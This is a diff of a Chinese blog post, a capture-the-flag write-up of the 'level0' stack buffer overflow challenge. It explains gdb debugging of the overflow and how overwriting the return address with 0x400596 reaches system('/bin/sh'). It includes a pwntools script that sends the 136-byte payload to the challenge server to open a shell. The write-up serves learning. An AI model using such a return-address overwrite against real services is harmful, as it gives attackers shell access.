@@ -66,7 +66,7 @@
 <meta property="og:image" content="http://xiaoxiaoxy1.github.io/2021/11/11/level0/image-20211111154230809.png">
 <meta property="og:image" content="http://xiaoxiaoxy1.github.io/2021/11/11/level0/image-20211111154428348.png">
 <meta property="article:published_time" content="2021-11-11T04:13:43.000Z">
-<meta property="article:modified_time" content="2021-11-11T07:46:32.067Z">
+<meta property="article:modified_time" content="2021-11-11T08:11:32.183Z">
 <meta property="article:author" content="xiaoxiaoxy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://xiaoxiaoxy1.github.io/2021/11/11/level0/image-20211111132507774.png">
@@ -225,7 +225,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-11-11 12:13:43 / Modified: 15:46:32" itemprop="dateCreated datePublished" datetime="2021-11-11T12:13:43+08:00">2021-11-11</time>
+      <time title="Created: 2021-11-11 12:13:43 / Modified: 16:11:32" itemprop="dateCreated datePublished" datetime="2021-11-11T12:13:43+08:00">2021-11-11</time>
     </span>
 
   
@@ -288,14 +288,14 @@
 <p><img src="image-20211111135316303.png" alt="image-20211111135316303"></p>
 <p>接着我们再单走5步 $ si （前4步使指针指向read，第5步进入read）进入read函数查看，此时刚进入read函数：</p>
 <p><img src="image-20211111140118890.png" alt="image-20211111140118890"></p>
-<p>看到此时栈段的地位地址：</p>
+<p>看到此时栈段的初始地址：</p>
 <p><img src="image-20211111140308756.png" alt="image-20211111140308756"></p>
 <p>使用 $ x/136wx 0x7fffffffdf08    从低地址向高地址打印136个内存地址（不标准术语）：</p>
 <p><img src="image-20211111141422227.png" alt="image-20211111141422227"></p>
 <p>记住此时栈的情况，如上↑</p>
 <p>再使用  $ x/180wx 0x7fffffffdf08    多打印一些栈空间存储情况用以与之后做对比：</p>
 <p><img src="image-20211111141759713.png" alt="image-20211111141759713"></p>
-<h6 id="高能预警："><a href="#高能预警：" class="headerlink" title="高能预警："></a>高能预警：</h6><p>接下来，我们返回ida去找到vulnerable_function函数的末尾地址，为什么要找？因为我们现在的指针刚进入read函数，指着read函数的初始地址，但<strong>我们调试的目的是</strong>要输入字符使输入的字符覆盖栈地址空间，然后查看栈情况看覆盖的地址对不对，而此时的指针位置离我们<strong>可输入字符的那条指令</strong>不知道还有多远（因为假如read函数还调用了其他系统函数的话，就会有很多额外指令，我们单走 $ si 不知道要走多少指令，单走一次 $ si 相当于系统执行一条普通指令，计算机执行指令的速度我在百度上搜了一下，1纳秒左右，不知道对不对，就算我们以1秒执行一次$ si 并查看当前指针位置的速度进行，跟1纳秒一条指令相比，差了10^9个数量级）所以我们直接找到vulnerable_function函数的末尾地址，计算机在断到这个断点之前一定会先执行<strong>可输入字符的那条指令</strong></p>
+<h6 id="高能预警："><a href="#高能预警：" class="headerlink" title="高能预警："></a>高能预警：</h6><p>接下来，我们返回ida去找到vulnerable_function函数的末尾地址，为什么要找？因为我们现在的指针刚进入read函数，指着read函数的初始地址，但<strong>我们调试的目的是</strong>要输入字符使输入的字符覆盖栈地址空间，然后查看栈情况看覆盖的地址对不对，而此时的指针位置离我们<strong>可输入字符的那条指令</strong>不知道还有多远（因为假如read函数还调用了其他系统函数的话，就会有很多额外指令，我们单走 $ si 不知道要走多少指令，单走一次 $ si 相当于系统执行一条普通指令，计算机执行指令的速度我在百度上搜了一下，1纳秒左右，不知道对不对，就算我们以1秒执行一次$ si 并查看当前指针位置的速度进行，跟1纳秒一条指令相比，差了10^9个数量级，简言之我们一步 $ si 执行一条指令,计算机相同时间内能执行10^9调指令）所以我们直接找到vulnerable_function函数的末尾地址，计算机在断到这个断点之前一定会先执行<strong>可输入字符的那条指令</strong>（这个可输入字符的指令是在vulnerable_function函数调用中出现的，所以我们执行到vulnerable_function函数的末尾一定会执行到这个可输入字符的指令）</p>
 <p>好吧，废话说多了，现在返回ida找末尾地址：</p>
 <p><img src="image-20211111142824910.png" alt="image-20211111142824910"></p>
 <p>因为我们要找末尾地址，所以我们点击return后按下tab键</p>
@@ -316,9 +316,9 @@
 <p>诶，我去，我还以为这里全部都会被0x61（字符a的ascll码值）填满，分析了一下，一个字符是十进制的1，而我们$ x/136wx 0x7fffffffdf08 中的136是16进制的136，转成10进制是310，可是我拿打印出的最后地址0x7fffffffe118-0x7fffffffdf08 = 0x210 = 528，懵了懵了</p>
 <p><img src="image-20211111151035567.png" alt="image-20211111151035567"></p>
 <p>好奇怪啊，算了这不是重点，这里不纠结了</p>
-<p>把之前的图拿过来对比一下，之前是没有0x61616161的：</p>
+<p>把之前的图拿过来对比一下，之前栈里面是没有0x61616161的：</p>
 <p><img src="image-20211111141422227.png" alt="image-20211111141422227"></p>
-<p>我们继续看栈，这个在覆盖了136个a字符的栈后面第一个东西是什么？是0x0040050a，这跟那些函数的起始地址长得很像不是吗，所以这应该就是一个return调用的地址没错了，<em><strong>也就是说我们构造的payload是没有问题的，得到的这个结论就是gdb调试的意义</strong>，我们之前说的payload = ‘a’</em>136+p64（0x00400596），这个0x00400596就是要把这里0x0040050a覆盖掉的新地址，覆盖以后再执行，就能进入system函数（system（”/bin/sh“））拿到shell</p>
+<p>我们继续看栈，这个在覆盖了136个a字符的栈后面第一个东西是什么？是0x0040050a，这跟那些函数的起始地址长得很像不是吗，所以这应该就是一个return调用的地址没错了，<em><strong>也就是说我们构造的payload是没有问题的，得到的这个结论就是gdb调试的意义</strong>，我们之前说的payload = ‘a’</em>136+p64（0x00400596），这个0x00400596就是要把这里0x0040050a覆盖掉的新地址，覆盖以后再执行程序，程序执行到这个return，return到0x0040050a，就能进入system函数（system（”/bin/sh“））拿到shell</p>
 <p><img src="image-20211111151348919.png" alt="image-20211111151348919"></p>
 <p>再重新理一遍本题原理：</p>
 <p>1、找到栈溢出函数（本题main() -&gt; vulnerable_function() -&gt; read()）</p>
@@ -331,6 +331,8 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                               <span class="comment">#导入pwn模块</span></span><br><span class="line">io = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;51403&#x27;</span>)          <span class="comment">#远端连接</span></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0000000000400596</span>))  <span class="comment">#发送数据  </span></span><br><span class="line">io.interactive()                                <span class="comment">#接收交互</span></span><br></pre></td></tr></table></figure>
 
 <p>写得好累，不过把基础知识打牢了很多，还行吧</p>
+<p>不知道我的文字描述别人看起来感觉怎么样，反正我自己看得有些吃力</p>
+<p>对了，如果发现有错误，欢迎指正（wx：xy1724252720）</p>
 
     </div>
 
